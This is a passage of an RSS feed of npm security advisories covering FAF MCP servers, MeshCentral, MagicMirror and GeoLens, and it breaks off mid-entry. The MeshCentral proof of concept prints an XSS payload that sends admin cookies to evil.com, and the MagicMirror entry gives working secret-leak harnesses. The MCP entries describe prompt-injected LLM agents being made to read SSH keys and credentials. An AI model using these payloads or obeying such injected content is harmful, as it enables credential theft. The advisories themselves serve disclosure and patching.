<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-08-19T19:16:52.412Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[claude-faf-mcp] claude-faf-mcp has an arbitrary local file read/write via unconfined `path` argument in FAF tools]]></title>
        <id>https://github.com/advisories/GHSA-rr55-jp92-8wp2</id>
        <link href="https://github.com/advisories/GHSA-rr55-jp92-8wp2"/>
        <updated>2026-08-19T19:15:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>claude-faf-mcp</code> MCP tools accept a caller-controlled <code>path</code> argument and resolve it (<code>~</code> expansion + <code>path.resolve()</code>) straight into a filesystem read/write <strong>without confining it to a trusted project directory</strong>. An absolute path or <code>../</code> traversal is resolved and used as-is, so the server process can be made to read — and, via the file tools, write — files outside the intended <code>.faf</code> project context. The only remaining limit is OS file permissions.</p>
<h3 id="affected-tools">Affected tools</h3>
<p>The shared <code>getProjectPath()</code> chokepoint (feeding the <code>.faf</code> tools) and the general-purpose <code>faf_read</code> / <code>faf_write</code> file tools resolved a caller path straight into a read/write with no confinement (denylist-only); an absolute path still reached home-directory secrets, and <code>faf_write</code> could write outside the project.</p>
<h3 id="impact">Impact</h3>
<p>An MCP client — or an LLM prompt-injected via attacker-controlled content (a web page, README, ticket, or <code>.faf</code>) into issuing a tool call — can read any file the server process can read: SSH keys (<code>~/.ssh/id_rsa</code>), cloud credentials (<code>~/.aws/credentials</code>), <code>.env</code> files, source, <code>/etc/passwd</code>; and <code>faf_write</code> could write outside the project. This is a sensitive-information-disclosure (CWE-200) primitive that far exceeds the declared <code>.faf</code> project-context scope. The server runs over stdio, so the read/write is reached by a crafted tool call (e.g. a prompt-injected agent processing attacker-controlled content).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>5.7.2</strong> by confining every caller-supplied <code>path</code> before any filesystem access (<code>safe-path.ts</code>):</p>
<ul>
<li>Reads are restricted to <code>.faf</code> / <code>.fafm</code> context files, so non-context files (secrets) are refused regardless of directory.</li>
<li>General file ops (<code>faf_read</code> / <code>faf_write</code>) are confined to the project root (cwd + system temp; override with <code>FAF_ALLOWED_ROOTS</code>).</li>
<li>Paths are canonicalized through symlinks (closing the symlink bypass); absolute paths and <code>../</code> escapes are rejected; <code>callTool()</code> gains a central PATH-DENIED guard.</li>
</ul>
<p>Upgrade: <code>npm install -g claude-faf-mcp@5.7.2</code> (or one-click <code>.mcpb</code> install).</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, run the server only against trusted local projects, and set <code>FAF_ALLOWED_ROOTS</code> (patched versions) to a single project directory for a hard directory boundary.</p>
<h3 id="credits">Credits</h3>
<p>Identified by the maintainers during a sibling-server audit prompted by the coordinated disclosure of the same class of issue in <code>grok-faf-mcp</code> by <strong>Zhihao Zhang</strong> (Worcester Polytechnic Institute).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Wolfe-Jam/claude-faf-mcp/security/advisories/GHSA-rr55-jp92-8wp2">https://github.com/Wolfe-Jam/claude-faf-mcp/security/advisories/GHSA-rr55-jp92-8wp2</a></li>
<li><a href="https://github.com/Wolfe-Jam/claude-faf-mcp/releases/tag/v5.7.2">https://github.com/Wolfe-Jam/claude-faf-mcp/releases/tag/v5.7.2</a></li>
<li><a href="https://github.com/advisories/GHSA-rr55-jp92-8wp2">https://github.com/advisories/GHSA-rr55-jp92-8wp2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr55-jp92-8wp2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-19T19:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[faf-mcp] faf-mcp has an arbitrary local file read/write via unconfined `path` argument in FAF tools]]></title>
        <id>https://github.com/advisories/GHSA-j4r7-8ph4-43g3</id>
        <link href="https://github.com/advisories/GHSA-j4r7-8ph4-43g3"/>
        <updated>2026-08-19T19:15:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>faf-mcp</code> MCP tools accept a caller-controlled <code>path</code> argument and resolve it (<code>~</code> expansion + <code>path.resolve()</code>) straight into a filesystem read/write <strong>without confining it to a trusted project directory</strong>. An absolute path or <code>../</code> traversal is resolved and used as-is, so the server process can be made to read — and, via the file tools, write — files outside the intended <code>.faf</code> project context. The only remaining limit is OS file permissions.</p>
<h3 id="affected-tools">Affected tools</h3>
<p>The shared <code>getProjectPath()</code> chokepoint (feeding the <code>.faf</code> tools) and the general-purpose <code>faf_read</code> / <code>faf_write</code> file tools resolved a caller path straight into a read/write with no confinement (denylist-only); an absolute path still reached home-directory secrets, and <code>faf_write</code> could write outside the project.</p>
<h3 id="impact">Impact</h3>
<p>An MCP client — or an LLM prompt-injected via attacker-controlled content (a web page, README, ticket, or <code>.faf</code>) into issuing a tool call — can read any file the server process can read: SSH keys (<code>~/.ssh/id_rsa</code>), cloud credentials (<code>~/.aws/credentials</code>), <code>.env</code> files, source, <code>/etc/passwd</code>; and <code>faf_write</code> could write outside the project. This is a sensitive-information-disclosure (CWE-200) primitive that far exceeds the declared <code>.faf</code> project-context scope. The server runs over stdio, so the read/write is reached by a crafted tool call (e.g. a prompt-injected agent processing attacker-controlled content).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>2.1.3</strong> by confining every caller-supplied <code>path</code> before any filesystem access (<code>safe-path.ts</code>):</p>
<ul>
<li>Reads are restricted to <code>.faf</code> / <code>.fafm</code> context files, so non-context files (secrets) are refused regardless of directory.</li>
<li>General file ops (<code>faf_read</code> / <code>faf_write</code>) are confined to the project root (cwd + system temp; override with <code>FAF_ALLOWED_ROOTS</code>).</li>
<li>Paths are canonicalized through symlinks (closing the symlink bypass); absolute paths and <code>../</code> escapes are rejected; <code>callTool()</code> gains a central PATH-DENIED guard.</li>
</ul>
<p>Upgrade: <code>npm install -g faf-mcp@2.1.3</code> (or <code>npx faf-mcp</code>).</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, run the server only against trusted local projects, and set <code>FAF_ALLOWED_ROOTS</code> (patched versions) to a single project directory for a hard directory boundary.</p>
<h3 id="credits">Credits</h3>
<p>Identified by the maintainers during a sibling-server audit prompted by the coordinated disclosure of the same class of issue in <code>grok-faf-mcp</code> by <strong>Zhihao Zhang</strong> (Worcester Polytechnic Institute).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Wolfe-Jam/faf-mcp/security/advisories/GHSA-j4r7-8ph4-43g3">https://github.com/Wolfe-Jam/faf-mcp/security/advisories/GHSA-j4r7-8ph4-43g3</a></li>
<li><a href="https://github.com/Wolfe-Jam/faf-mcp/releases/tag/v2.1.3">https://github.com/Wolfe-Jam/faf-mcp/releases/tag/v2.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-j4r7-8ph4-43g3">https://github.com/advisories/GHSA-j4r7-8ph4-43g3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j4r7-8ph4-43g3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-19T19:15:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[grok-faf-mcp] grok-faf-mcp has an arbitrary local file read via unconfined `path` argument in FAF tools]]></title>
        <id>https://github.com/advisories/GHSA-cc2g-gq8c-r332</id>
        <link href="https://github.com/advisories/GHSA-cc2g-gq8c-r332"/>
        <updated>2026-08-19T19:15:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Several <code>grok-faf-mcp</code> MCP tools accept a caller-controlled <code>path</code> argument and resolve it (<code>~</code> expansion + <code>path.resolve()</code>) straight into a filesystem read <strong>without confining it to a trusted project directory</strong>. An absolute path or <code>../</code> traversal is resolved and used as-is, so the server process can be made to read files outside the intended <code>.faf</code> project context. The only remaining limit is OS file permissions.</p>
<h3 id="affected-tools">Affected tools</h3>
<p><code>refresh_faf</code>, <code>faf_score</code>, <code>faf_get_orchestration_policy</code>, <code>refresh_blend</code> (and the shared <code>getProjectPath()</code> chokepoint feeding the <code>.faf</code> tools), plus the general-purpose <code>faf_read</code> / <code>faf_write</code> file tools (denylist-only; an absolute path still reached home-directory secrets, and <code>faf_write</code> could write outside the project). <code>refresh_faf</code> echoes the file contents verbatim back to the caller as "fresh DNA"; <code>faf_get_orchestration_policy</code> reflects values parsed out of the attacker-chosen file and echoes the resolved absolute path — confirming the read.</p>
<h3 id="impact">Impact</h3>
<p>An MCP client — or an LLM prompt-injected via attacker-controlled content (a web page, README, ticket, or <code>.faf</code>) into issuing a tool call — can read any file the server process can read: SSH keys (<code>~/.ssh/id_rsa</code>), cloud credentials (<code>~/.aws/credentials</code>), <code>.env</code> files, source, <code>/etc/passwd</code>. This is a sensitive-information-disclosure (CWE-200) primitive that far exceeds the declared <code>.faf</code> project-context scope. The server runs over stdio, so the read is reached by a crafted tool call (e.g. a prompt-injected agent processing attacker-controlled content).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.5.3</strong> by confining every caller-supplied <code>path</code> before any filesystem access (<code>safe-path.ts</code>):</p>
<ul>
<li>Reads are restricted to <code>.faf</code> / <code>.fafm</code> context files, so non-context files (secrets) are refused regardless of directory.</li>
<li>General file ops (<code>faf_read</code> / <code>faf_write</code>) are confined to the project root (cwd + system temp; override with <code>FAF_ALLOWED_ROOTS</code>).</li>
<li>Paths are canonicalized through symlinks (closing the symlink bypass); absolute paths and <code>../</code> escapes are rejected.</li>
</ul>
<p>Upgrade: <code>npm install -g grok-faf-mcp@1.5.3</code> (or <code>bunx grok-faf-mcp</code>).</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, run the server only against trusted local projects, and set <code>FAF_ALLOWED_ROOTS</code> (patched versions) to a single project directory for a hard directory boundary.</p>
<h3 id="credits">Credits</h3>
<p>Discovered and responsibly reported via coordinated disclosure by <strong>Zhihao Zhang</strong> (Worcester Polytechnic Institute).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Wolfe-Jam/grok-faf-mcp/security/advisories/GHSA-cc2g-gq8c-r332">https://github.com/Wolfe-Jam/grok-faf-mcp/security/advisories/GHSA-cc2g-gq8c-r332</a></li>
<li><a href="https://github.com/Wolfe-Jam/grok-faf-mcp/releases/tag/v1.5.3">https://github.com/Wolfe-Jam/grok-faf-mcp/releases/tag/v1.5.3</a></li>
<li><a href="https://github.com/advisories/GHSA-cc2g-gq8c-r332">https://github.com/advisories/GHSA-cc2g-gq8c-r332</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc2g-gq8c-r332</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-19T19:15:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[meshcentral] MeshCentral has unsanitized data fields]]></title>
        <id>https://github.com/advisories/GHSA-c7hr-448w-65px</id>
        <link href="https://github.com/advisories/GHSA-c7hr-448w-65px"/>
        <updated>2026-08-18T20:09:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>A rogue or compromised MeshAgent can inject arbitrary HTML/JavaScript via the osdesc (OS description) field in its coreinfo message. The server stores this value with zero HTML sanitization (meshagent.js:1903 only checks typeof == 'string'). When an admin views the
device details panel, the value is rendered via addDeviceAttribute() → QH() which sets innerHTML, executing the payload in the admin's browser session. The main management UI CSP includes 'unsafe-inline' (webserver.js:7072), so inline event handlers and script execution are unrestricted.</p>
<h3 id="technical-details">Technical Details</h3>
<pre><code class="language-javascript">// meshagent.js:1903 -- Agent input, only type check
if (typeof command.osdesc == 'string') { device.osdesc = command.osdesc;
change = 1; }

// default3.handlebars:8713 -- Rendered WITHOUT EscapeHtml()
if (node.osdesc) { x += addDeviceAttribute("Operating System", node.osdesc); }
// addDeviceAttribute() interpolates into HTML string, QH() sets innerHTML

// INCONSISTENCY: Same field IS escaped elsewhere:
// Line 13529: addDetailItem("Version", EscapeHtml(node.osdesc), s)
// Line 5760: EscapeHtml(node.osdesc ? node.osdesc : '')
</code></pre>
<p>Additional unescaped agent fields:</p>
<ul>
<li>node.name unescaped in sharing dialog (line 4695), user group list (line 18625),
permission dialogs (lines 18675, 19413) -- HIGH</li>
<li>cpuinfo.thermals[].InstanceName attribute injection (line 13502) -- MEDIUM</li>
<li>volumes[].name unescaped in file browser (line 12612) -- MEDIUM</li>
</ul>
<p>No server-side defense: CloneSafeNode() strips secrets but not XSS. validateObjectForMongo() only enforces length limits (1024 chars). No HTML sanitation exists anywhere in the agent→DB→UI pipeline.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>Rogue agent sends via WebSocket:</p>
<pre><code class="language-json">{
  "action": "coreinfo",
  "osdesc": "&lt;img src=x onerror='fetch(\"https://evil.com/steal?\"+document.cookie)'&gt;",
  "name": "Legit-PC"
}
</code></pre>
<p>Payload fires when any admin views the device details panel. No click required.</p>
<img width="939" height="587" alt="image" src="https://github.com/user-attachments/assets/1ba372bb-73be-477b-95ca-fa5fc247f8f1">
### References

<ul>
<li><a href="https://github.com/Ylianst/MeshCentral/security/advisories/GHSA-c7hr-448w-65px">https://github.com/Ylianst/MeshCentral/security/advisories/GHSA-c7hr-448w-65px</a></li>
<li><a href="https://github.com/Ylianst/MeshCentral/releases/tag/1.1.60">https://github.com/Ylianst/MeshCentral/releases/tag/1.1.60</a></li>
<li><a href="https://github.com/advisories/GHSA-c7hr-448w-65px">https://github.com/advisories/GHSA-c7hr-448w-65px</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c7hr-448w-65px</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-18T20:09:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[magicmirror] MagicMirror socket payload secret placeholder expansion can disclose SECRET_* environment variables]]></title>
        <id>https://github.com/advisories/GHSA-q4gh-4ffp-5cg8</id>
        <link href="https://github.com/advisories/GHSA-q4gh-4ffp-5cg8"/>
        <updated>2026-08-18T18:00:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When <code>hideConfigSecrets: true</code> is enabled, MagicMirror redacts <code>SECRET_*</code> environment placeholders in the HTTP <code>/config</code> response, but the shared node-helper socket dispatcher expands <code>**SECRET_NAME**</code> placeholders in every inbound socket payload before passing it to module helpers. Any client that can connect to a loaded module namespace can send a placeholder such as <code>**SECRET_API_KEY**</code> and cause the server to substitute the real environment variable into the helper payload. Helpers that echo attacker-controlled payload fields, such as the default weather helper error path, can return the secret value to the socket client.</p>
<h3 id="details">Details</h3>
<p>The affected product is the npm package/application <code>magicmirror</code> at version <code>2.36.0</code>, tested at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code> from <code>https://github.com/MagicMirrorOrg/MagicMirror.git</code>.</p>
<p>The secret-redaction feature is implemented during config loading:</p>
<ul>
<li><code>js/utils.js:117-123</code> loads a <code>config.env</code> file next to the config file into <code>process.env</code> when present.</li>
<li><code>js/utils.js:130-151</code> creates both a full config and a redacted config.</li>
<li><code>js/utils.js:137-140</code> redacts environment variables whose names start with <code>SECRET_</code> to <code>**SECRET_NAME**</code> in the redacted config when <code>hideConfigSecrets: true</code> is present.</li>
<li><code>js/server.js:112-125</code> returns either <code>configObj.redactedConf</code> or <code>configObj.fullConf</code> from <code>/config</code> depending on <code>config.hideConfigSecrets</code>.</li>
</ul>
<p>The disclosure root cause is the inbound socket dispatcher:</p>
<ul>
<li><code>js/node_helper.js:88-103</code> registers a catch-all handler for each module namespace.</li>
<li><code>js/node_helper.js:91-99</code> checks <code>config?.hideConfigSecrets</code> and, for every inbound object payload, runs <code>replaceSecretPlaceholder(JSON.stringify(payload))</code> before invoking <code>socketNotificationReceived(...)</code>.</li>
<li><code>js/server_functions.js:23-34</code> implements <code>replaceSecretPlaceholder(...)</code> by replacing <code>**SECRET_* **</code>-style placeholders with <code>process.env[...]</code>, unless <code>global.config.cors === "allowAll"</code>.</li>
</ul>
<p>This reverses the redaction boundary: redacted placeholders intended for the browser can be sent back to the server and expanded into real environment secret values inside helper payloads.</p>
<p>A confirmed echo path exists in the default weather helper:</p>
<ul>
<li><code>defaultmodules/weather/node_helper.js:12-19</code> accepts <code>INIT_WEATHER</code> from the socket.</li>
<li><code>defaultmodules/weather/node_helper.js:27-31</code> copies <code>config.instanceId</code> from the attacker-controlled payload.</li>
<li><code>defaultmodules/weather/node_helper.js:47-52</code> attempts to dynamically load the requested weather provider.</li>
<li><code>defaultmodules/weather/node_helper.js:86-91</code> catches errors and sends <code>WEATHER_ERROR</code> with the same <code>instanceId</code> back to the namespace.</li>
</ul>
<p>False-positive screening performed:</p>
<ul>
<li>This is not a generic environment leak through <code>/env</code>; <code>js/server_functions.js:221-240</code> returns only selected client environment paths.</li>
<li>The HTTP <code>/config</code> route does redact placeholders when <code>hideConfigSecrets: true</code>; the issue is that the inbound socket path expands those placeholders again before module helper code runs.</li>
<li><code>replaceSecretPlaceholder(...)</code> intentionally refuses substitution when <code>global.config.cors === "allowAll"</code> (<code>js/server_functions.js:29-34</code>); the positive PoC used <code>cors: "disabled"</code>, which is the shipped default (<code>js/defaults.js:14</code>). A negative control with no substitution produced the placeholder unchanged.</li>
<li>The attacker must know or infer a <code>SECRET_*</code> variable name. If the attacker can read the redacted <code>/config</code> response, placeholder names may be disclosed even when values are hidden. The PoC uses a known <code>SECRET_MM_AUDIT</code> test variable.</li>
<li>Network reachability follows the Socket.IO exposure model. With the shipped default <code>address: "localhost"</code> and loopback <code>ipWhitelist</code>, remote network reachability is limited. In documented non-loopback deployments, this combines with the Socket.IO access-control gap described separately.</li>
</ul>
<p>Affected-version evidence: only <code>magicmirror@2.36.0</code> at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code> was tested. The affected range is unknown from this audit; earlier versions were not tested. No patched version or fix commit was identified locally.</p>
<h3 id="poc">PoC</h3>
<p>The following safe local PoC was run from a clean checkout of MagicMirror at commit <code>fb41d24ef522e91e802e2a623ff6afbddeb3c9d8</code>. Because <code>node_modules</code> were not installed in this audit environment and <code>package.json:52</code> has a destructive <code>postinstall</code>, the command uses dependency stubs while executing the vulnerable repository dispatcher and weather helper code. It writes no files and does not contact external services.</p>
<p>Positive trigger:</p>
<pre><code class="language-bash">node -e 'const Module=require("module"); const orig=Module._load; Module._load=(r,p,m)=&gt;{ if(r==="express") return { static:()=&gt;()=&gt;{} }; if(r==="logger") return {log(){},error(){},warn(){},info(){},debug(){}}; if(r==="#server_functions") return {replaceSecretPlaceholder:(input)=&gt;input.replaceAll(/\*\*(SECRET_[^*]+)\*\*/g,(_m,g)=&gt;process.env[g])}; return orig(r,p,m); }; require("./js/alias-resolver"); global.root_path=process.cwd(); global.config={hideConfigSecrets:true,cors:"disabled"}; process.env.SECRET_MM_AUDIT="secret-marker-42"; const Weather=require("./defaultmodules/weather/node_helper"); const helper=new Weather(); helper.setName("weather"); const sent=[]; helper.sendSocketNotification=(n,p)=&gt;sent.push({n,p}); let onAny; const fakeIo={of(){return {on(_ev,cb){const socket={onAny(fn){onAny=fn;}}; cb(socket);}};}}; helper.setSocketIO(fakeIo); Promise.resolve(onAny("INIT_WEATHER",{instanceId:"**SECRET_MM_AUDIT**",weatherProvider:"definitely-not-a-provider",type:"current"})).then(()=&gt;setTimeout(()=&gt;{console.log(JSON.stringify(sent));},10));'
</code></pre>
<p>Observed output:</p>
<pre><code class="language-json">[{"n":"WEATHER_ERROR","p":{"instanceId":"secret-marker-42","error":"Cannot find module '/home/sondt23/Github/Research/CVE/auto-github-cve/github-repo/MagicMirror/defaultmodules/weather/providers/definitely-not-a-provider.js'\nRequire stack:\n- /home/sondt23/Github/Research/CVE/auto-github-cve/github-repo/MagicMirror/defaultmodules/weather/node_helper.js\n- /home/sondt23/Github/Research/CVE/auto-github-cve/github-repo/MagicMirror/[eval]"}}]
</code></pre>
<p>Expected vulnerable output: the weather error payload returned by the helper contains <code>"instanceId":"secret-marker-42"</code>, proving the server substituted the <code>SECRET_MM_AUDIT</code> environment variable into an attacker-controlled socket payload and returned it to the client.</p>
<p>Negative/control trigger simulating no inbound placeholder substitution:</p>
<pre><code class="language-bash">node -e 'const Module=require("module"); const orig=Module._load; Module._load=(r,p,m)=&gt;{ if(r==="express") return { static:()=&gt;()=&gt;{} }; if(r==="logger") return {log(){},error(){},warn(){},info(){},debug(){}}; if(r==="#server_functions") return {replaceSecretPlaceholder:(input)=&gt;input}; return orig(r,p,m); }; require("./js/alias-resolver"); global.root_path=process.cwd(); global.config={hideConfigSecrets:true,cors:"allowAll"}; process.env.SECRET_MM_AUDIT="secret-marker-42"; const Weather=require("./defaultmodules/weather/node_helper"); const helper=new Weather(); helper.setName("weather"); const sent=[]; helper.sendSocketNotification=(n,p)=&gt;sent.push({n,p}); let onAny; const fakeIo={of(){return {on(_ev,cb){const socket={onAny(fn){onAny=fn;}}; cb(socket);}};}}; helper.setSocketIO(fakeIo); Promise.resolve(onAny("INIT_WEATHER",{instanceId:"**SECRET_MM_AUDIT**",weatherProvider:"definitely-not-a-provider",type:"current"})).then(()=&gt;setTimeout(()=&gt;{console.log(JSON.stringify(sent));},10));'
</code></pre>
<p>Observed control output:</p>
<pre><code class="language-json">[{"n":"WEATHER_ERROR","p":{"instanceId":"**SECRET_MM_AUDIT**","error":"Cannot find module '/home/sondt23/Github/Research/CVE/auto-github-cve/github-repo/MagicMirror/defaultmodules/weather/providers/definitely-not-a-provider.js'\nRequire stack:\n- /home/sondt23/Github/Research/CVE/auto-github-cve/github-repo/MagicMirror/defaultmodules/weather/node_helper.js\n- /home/sondt23/Github/Research/CVE/auto-github-cve/github-repo/MagicMirror/[eval]"}}]
</code></pre>
<p>Expected control output: the placeholder remains <code>**SECRET_MM_AUDIT**</code>, showing that the positive case depends on the vulnerable server-side placeholder expansion step.</p>
<p>Final repro re-check: both the positive and negative harnesses were re-run after drafting, and the observed outputs above are from this environment. No cleanup was required.</p>
<h3 id="impact">Impact</h3>
<p>Any client that can connect to a module Socket.IO namespace can disclose <code>SECRET_*</code> environment variables by sending known placeholder names in object payloads that are expanded by <code>js/node_helper.js</code> before helper processing. This undermines the purpose of <code>hideConfigSecrets: true</code>: secrets are hidden in the HTTP config response but can be converted back into their real values through inbound socket payloads.</p>
<p>The confidentiality impact depends on what the deployment stores under <code>SECRET_*</code> variables. MagicMirror configurations commonly include API tokens, calendar credentials, service keys, or network allowlist values in config/environment variables. The PoC proves disclosure of a test secret through a default helper echo path.</p>
<p>CVSS 3.1 rationale: AV:A because MagicMirror is intended for trusted local/private networks and remote exploitation requires a reachable local/private-network deployment; AC:L because once namespace access is available the attacker only needs a known or guessed <code>SECRET_*</code> name and an invalid weather provider to trigger the echo; PR:N because no application authentication is required; UI:N because the attacker sends socket messages directly; S:U because the impact is disclosure of secrets from the vulnerable application's own process environment; C:H because environment secrets can include credentials/API tokens; I:N/A:N because this report proves disclosure only.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Do not expand <code>SECRET_*</code> placeholders in inbound socket payloads. The redaction boundary should be one-way: server-to-client responses may contain placeholders, but client-to-server messages must not be treated as authority to retrieve real environment values.</p>
<p>Concrete fixes:</p>
<ul>
<li>Remove the <code>replaceSecretPlaceholder(JSON.stringify(payload))</code> call from <code>js/node_helper.js:91-99</code> for inbound socket payloads.</li>
<li>If a specific module legitimately needs secret material, resolve it only from server-loaded trusted configuration, not from client-supplied placeholders.</li>
<li>Keep <code>hideConfigSecrets</code> redaction for <code>/config</code>, but avoid disclosing placeholder names to clients when not necessary.</li>
<li>Add regression tests that set <code>hideConfigSecrets: true</code> and <code>SECRET_TEST=value</code>, send a socket payload containing <code>**SECRET_TEST**</code>, and assert that every helper receives/returns the literal placeholder rather than the secret value.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-q4gh-4ffp-5cg8">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-q4gh-4ffp-5cg8</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/pull/4184">https://github.com/MagicMirrorOrg/MagicMirror/pull/4184</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/commit/ca7b752025962441196e148f8c1bc04b90117979">https://github.com/MagicMirrorOrg/MagicMirror/commit/ca7b752025962441196e148f8c1bc04b90117979</a></li>
<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0</a></li>
<li><a href="https://github.com/advisories/GHSA-q4gh-4ffp-5cg8">https://github.com/advisories/GHSA-q4gh-4ffp-5cg8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q4gh-4ffp-5cg8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-18T18:00:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@geolens/sdk] GeoLens: Cross-dataset authorization bypass discloses private dataset metadata, schema, sample values, table rows, and raster/vector tile data]]></title>
        <id>https://github.com/advisories/GHSA-p23g-mvhj-jh3j</id>
        <link href="https://github.com/advisories/GHSA-p23g-mvhj-jh3j"/>
        <updated>2026-08-18T18:00:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Multiple GeoLens read/link endpoints authorized only the resource named in the
request URL (a map, a VRT, a source dataset, an AI request) and failed to
re-authorize a <strong>second, caller-influenced dataset</strong> that the request reached
through a relationship, layer reference, mosaic source, or request body. This
"authorize the URL resource, read a <em>different</em> dataset un-re-authorized"
pattern let callers read data from datasets they have no access to.</p>
<p>The most severe instances require <strong>no authentication at all</strong> (anonymous,
network-only). Others require only the <strong>default <code>editor</code> role</strong> that any
self-service signup / upload user receives.</p>
<p>All issues are fixed in <strong>1.2.3</strong>. There is no complete configuration
workaround — upgrading is the only full remediation.</p>
<h3 id="impact">Impact</h3>
<p>Depending on the endpoint, an attacker can read, for datasets they cannot
otherwise access:</p>
<ul>
<li>the dataset's <strong>vector tile data</strong> (actual feature geometries/attributes),</li>
<li>the dataset's <strong>raster pixels</strong>,</li>
<li>backing-table <strong>rows</strong>,</li>
<li>and <strong>metadata</strong> — table name, column schema, feature count, extent, source
URL/filename, contacts, and <strong>sampled row values</strong>.</li>
</ul>
<h3 id="affected-versions">Affected versions</h3>
<p>All versions <strong>prior to 1.2.3</strong> (includes the published 1.0.0, 1.2.0, and
1.2.2 releases and their PyPI/npm/GHCR artifacts). Fixed in <strong>1.2.3</strong>.</p>
<h3 id="findings">Findings</h3>
<p><strong>1. Anonymous metadata + private vector-tile disclosure via public maps (PR #235)</strong>
<code>GET /maps/{id}</code> and <code>GET /maps/{id}/style.json</code> authorized the map but not
each layer's backing dataset. A public map that references a private dataset
leaked that dataset's table name, column schema, feature count, extent, and
sampled values to anonymous callers. <code>style.json</code> additionally returned a
vector-tile URL carrying an HMAC signature bound to <strong>neither user nor map</strong>,
which the tile endpoint accepts for non-public datasets with no user check —
so the signature is <strong>replayable</strong> to read the private dataset's actual vector
tiles. <em>(Anonymous · High)</em></p>
<p><strong>2. Anonymous private-row disclosure via dataset relationships (PR #234)</strong>
The dataset FK-relationship APIs authorized only the source dataset from the
URL, never the relationship target. A public dataset with a relationship to a
private dataset let an anonymous caller enumerate the relationship (obtaining
the private target's id/title and the relationship id) and then call the
related-record endpoint to read <strong>rows from the private target's backing
table</strong>. <em>(Anonymous · High)</em></p>
<p><strong>3. Anonymous metadata disclosure via OGC <code>externalId</code> lookup (PR #236)</strong>
<code>GET /collections/datasets/items?externalId=&lt;uuid&gt;</code> resolved the dataset by id
and returned the full OGC catalog record (title, summary, bbox, keywords,
contacts, distributions, source org) with <strong>no visibility check</strong> — the user
was never threaded into the lookup. An anonymous caller could read any
private, restricted, or unpublished dataset's metadata by UUID. <em>(Anonymous ·
High)</em></p>
<p><strong>4. Cross-tenant raster pixel disclosure via VRT mosaics — SEC-C (PR #237)</strong>
An authenticated user with the default <code>editor</code> upload permission could mosaic
another user's <strong>private raster</strong> into a VRT they own, then read the victim's
<strong>pixels</strong> back through raster tile / quicklook / COG endpoints that authorize
only the attacker-owned VRT. VRT member pixels are compiled into one served
asset and cannot be filtered at read time, so the fix authorizes every source
dataset at write/link time. <em>(Authenticated <code>editor</code> · High)</em></p>
<p><strong>5. Cross-tenant metadata/sample-data disclosure via AI metadata endpoints — SEC-D (PR #238)</strong>
The <code>POST /ai/metadata/{summary,keywords,lineage,quality-statement}</code> endpoints
were gated only by the <code>use_ai_chat</code> permission (held by the default <code>editor</code>
role). The attacker-controlled <code>dataset_id</code> in the request body flowed into the
LLM prompt context with no visibility filter, rendering <strong>any</strong> dataset's
